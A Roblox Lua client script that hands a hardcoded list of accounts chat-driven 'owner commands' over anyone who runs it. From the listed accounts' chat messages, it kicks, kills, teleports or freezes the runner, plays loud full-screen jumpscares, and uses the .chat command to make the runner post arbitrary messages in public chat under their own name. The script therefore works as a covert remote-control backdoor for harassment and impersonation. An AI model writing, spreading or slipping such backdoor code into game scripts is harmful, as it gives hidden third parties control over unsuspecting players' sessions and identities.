local function nameMatches(player, partialName)
    local nameLower = player.Name:lower()
    local displayNameLower = player.DisplayName:lower()
    partialName = partialName:lower()
    
    -- Exact matches
    if nameLower == partialName or displayNameLower == partialName then
        return true
    end
    
    -- Partial matches
    if nameLower:find(partialName, 1, true) or displayNameLower:find(partialName, 1, true) then
        return true
    end
    
    return false
end

local adminCmd = {
    "AK_ADMEN1", "Xeni_he07", "AK_ADMEN2", "goekaycool", "GYATT_DAMN1", 
    "ddddd", "IIIlIIIllIlIllIII", "AliKhammas1234", 
    "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD", "BloxiAstra", "ImOn_ValveIndex"
}

local commandsList = {
    ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
    ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
    ".kick", ".kill", ".bring", ".js", ".js2", ".invert", 
    ".uninvert", ".spin", ".unspin", ".disablejump", ".unenablejump",
    ".squeak", ".bighead", ".tiny", ".big", ".sillyhat"
}

local frozenPlayers = {}
local controlInversionActive = {}
local spinActive = {}
local jumpDisabled = {}

local function Chat(msg)
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = msg,
        Color = Color3.new(1, 0, 0),
        Font = Enum.Font.SourceSans,
        FontSize = Enum.FontSize.Size24,
    })
end

local function createCommandGui(player)
    local gui = Instance.new("ScreenGui", player.PlayerGui)
    gui.Name = "CommandGui"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.3, 0, 0.4, 0) -- Smaller GUI
    frame.Position = UDim2.new(0.35, 0, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local titleLabel = Instance.new("TextLabel", frame)
    titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.Text = "Owner Commands"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24

    local scrollFrame = Instance.new("ScrollingFrame", frame)
    scrollFrame.Size = UDim2.new(1, 0, 0.8, 0)
    scrollFrame.Position = UDim2.new(0, 0, 0.1, 0)
    scrollFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    scrollFrame.ScrollBarThickness = 8
    scrollFrame.CanvasSize = UDim2.new(0, 0, 5, 0) -- Adjust for commands

    local layout = Instance.new("UIListLayout", scrollFrame)
    layout.Padding = UDim.new(0, 5)

    for _, command in ipairs(commandsList) do
        local commandLabel = Instance.new("TextLabel", scrollFrame)
        commandLabel.Size = UDim2.new(1, 0, 0, 30)
        commandLabel.Text = command
        commandLabel.TextColor3 = Color3.new(1, 1, 1)
        commandLabel.BackgroundTransparency = 1
        commandLabel.Font = Enum.Font.SourceSans
        commandLabel.TextSize = 20
    end

    local closeButton = Instance.new("TextButton", frame)
    closeButton.Size = UDim2.new(0.3, 0, 0.1, 0)
    closeButton.Position = UDim2.new(0.35, 0, 0.9, 0)
    closeButton.Text = "Close"
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.Font = Enum.Font.SourceSans
    closeButton.TextSize = 18

    closeButton.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- Make the frame draggable
    local dragging, dragInput, dragStart, startPos
    local UIS = game:GetService("UserInputService")

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
end

-- Execute the command on the specific target
local function executeCommand(admin, target, command)
    if admin.Name == target.Name then
        Chat("You cannot target yourself!")
        return
    end
    
    if command == ".kill" then
        target.Character.Humanoid.Health = 0
    elseif command == ".bring" then
        target.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
    else
        Chat("Command not recognized or not implemented.")
    end
end

-- Admin command handling
local function setupAdminCommands(admin)
    admin.Chatted:Connect(function(msg)
        msg = msg:lower()
        local command, targetPartialName = msg:match("^(%S+)%s+(.*)$")
        if not command or not targetPartialName then
            command = msg -- If no target name is specified, just check the command
        end

        -- Get the target player if a name was specified
        local targetPlayer
        if targetPartialName then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if nameMatches(p, targetPartialName) then
                    targetPlayer = p
                    break
                end
            end
        end

        local player = game.Players.LocalPlayer
        -- Only process commands without targets, or commands where this player is the target
        if not targetPartialName or (targetPlayer and targetPlayer == player) then
            -- Admin Commands
            if command == ".ownercmds" then
                createCommandGui(player)
            elseif command == ".rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
            elseif command == ".fast" then
                player.Character.Humanoid.WalkSpeed = 50
            elseif command == ".normal" then
                player.Character.Humanoid.WalkSpeed = 16
            elseif command == ".slow" then
                player.Character.Humanoid.WalkSpeed = 5
            elseif command == ".unfloat" then
                player.Character.HumanoidRootPart.Anchored = false
            elseif command == ".float" then
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                wait(0.3)
                player.Character.HumanoidRootPart.Anchored = true
            elseif command == ".void" then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
            elseif command == ".jump" then
                player.Character.Humanoid.Jump = true
elseif command == ".trip" then
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
elseif command == ".chat" then
    -- Extract the target and message from the command
    local _, targetAndMessage = msg:match("^(.chat)%s+(.+)$")
    if targetAndMessage then
        local target, message = targetAndMessage:match("^(%S+)%s+(.+)$")
        if target and message then
            -- Find the target player
            local targetPlayer
            for _, p in ipairs(game.Players:GetPlayers()) do
                if nameMatches(p, target) then
                    targetPlayer = p
                    break
                end
            end
            
            if targetPlayer and targetPlayer == player then
                -- Chat function
                local function chat(txt)
                    if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(txt,"All")
                    else
                        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(txt)
                    end
                end
                
                -- Send the chat message
                chat(message)
            end
        end
    end

            elseif command == ".sit" then
                player.Character.Humanoid.Sit = true
            elseif command == ".freeze" then
                player.Character.HumanoidRootPart.Anchored = true
                frozenPlayers[player.UserId] = true
            elseif command == ".unfreeze" then
                for userId in pairs(frozenPlayers) do
                    local frozenPlayer = game.Players:GetPlayerByUserId(userId)
                    if frozenPlayer and frozenPlayer.Character then
                        frozenPlayer.Character.HumanoidRootPart.Anchored = false
                    end
                end
                frozenPlayers = {}
            elseif command == ".kick" then
                player:Kick("Kicked")
            elseif command == ".kill" then
                player.Character.Humanoid.Health = 0
            elseif command == ".bring" then
                player.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
            elseif command == ".js" then
                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=10798732430"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://7076365030", 10
                sound:Play()
                wait(1.674)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".js2" then
                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=75431648694596"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://5567523008", 10
                sound:Play()
                wait(3.599)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".invert" then
                if not controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local inversionConnection = humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
                            humanoid:Move(Vector3.new(-humanoid.MoveDirection.X, 0, -humanoid.MoveDirection.Z), true)
                        end)
                        wait(10) -- Invert for 10 seconds
                        inversionConnection:Disconnect()
                        controlInversionActive[player.UserId] = nil
                    end
                end
            elseif command == ".uninvert" then
                if controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = nil
                end
            elseif command == ".spin" then
                if not spinActive[player.UserId] then
                    spinActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local initialRotation = char.HumanoidRootPart.CFrame
                        for i = 1, 12 do
                            wait(0.1)
                            char.HumanoidRootPart.CFrame = initialRotation * CFrame.Angles(0, math.rad(30 * i), 0)
                        end
                    end
                end
            elseif command == ".unspin" then
                if spinActive[player.UserId] then
                    spinActive[player.UserId] = nil
                end
            elseif command == ".disablejump" then
                if not jumpDisabled[player.UserId] then
                    jumpDisabled[player.UserId] = true
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 0
                        wait(5)
                        humanoid.JumpPower = 50 -- Reset jump power (default can vary)
                        jumpDisabled[player.UserId] = nil
                    end
                end
            elseif command == ".unenablejump" then
                if jumpDisabled[player.UserId] then
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 50 -- Reset jump power
                    end
                    jumpDisabled[player.UserId] = nil
                end
            elseif command == ".squeak" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://507771019"
                sound:Play()
                wait(1) -- Wait for the sound to finish
                sound:Destroy()
            elseif command == ".bighead" then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    head.Size = head.Size * 2
                end
            elseif command == ".tiny" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(0.5, 0.5, 0.5)
                end
            elseif command == ".big" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(2, 2, 2)
                end
            elseif command == ".sillyhat" then
                local hat = Instance.new("Accessory")
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshId = "rbxassetid://507771019" -- Change this to a funny hat asset ID
                mesh.Parent = hat
                hat.Parent = player.Character
            end
        end
    end)
end

-- Add admin functionality for listed users
for _, player in ipairs(game.Players:GetPlayers()) do
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end)
